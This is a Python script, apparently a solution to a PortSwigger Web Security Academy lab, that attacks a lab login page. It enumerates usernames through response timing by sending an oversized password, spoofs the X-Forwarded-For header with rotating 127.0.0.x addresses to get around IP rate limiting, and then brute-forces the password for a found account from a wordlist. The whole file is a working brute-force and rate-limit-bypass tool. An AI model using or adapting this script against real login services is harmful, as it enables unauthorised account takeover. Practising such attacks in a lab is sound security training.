import requests
import time

with open('account.txt', 'r') as f:
    account = f.readlines()

with open('password.txt', 'r') as f:
    password = f.readlines()

URL = "https://0a9700af0368f8928089a379000b0018.web-security-academy.net/login"


############################
# Phase 1: Finding account #
############################
for count in range(len(account)): 
    acc = account[count].split()
    start = time.perf_counter()
    response = requests.post(URL, data={"username": acc[0], "password": "lmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmaolmao" },
                             headers={'X-Forwarded-For': f'127.0.0.{count+1}'})
    request_time = time.perf_counter() - start
    print(f"[+] Request completed in {request_time} seconds " + acc[0])


#############################
# Phase 2: Finding Password #
#############################

#secondsapps
for count in range(len(password)): 
    acc = account[count].split()
    start = time.perf_counter()
    response = requests.post(URL, data={"username": "secondsapps", "password": password[count]},
                             headers={'X-Forwarded-For': f'127.0.0.{count+1}'})
    print("[*] Trying password: " + password[count])
    if "Your username is" in response.text:
        print(f"[+] Password found: {password[count]}")
        break
    